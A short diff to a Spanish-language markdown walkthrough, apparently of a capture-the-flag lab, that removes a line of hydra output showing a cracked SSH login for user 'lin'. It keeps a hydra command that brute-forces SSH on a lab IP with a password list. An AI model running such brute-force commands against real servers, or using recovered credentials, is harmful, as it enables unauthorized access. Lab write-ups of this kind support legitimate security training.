@@ -91,7 +91,6 @@ Uso hydra para comprobar si tengo acceso al servidor SSH mediante el usuario lin
 
 ```bash
 hydra -V -t 50 -l lin -P locks.txt  ssh://10.10.54.251 -f -I
-[22][ssh] host: 10.10.54.251   login: lin   password: RedDr4gonSynd1cat3
 ```
 
 ### SSH
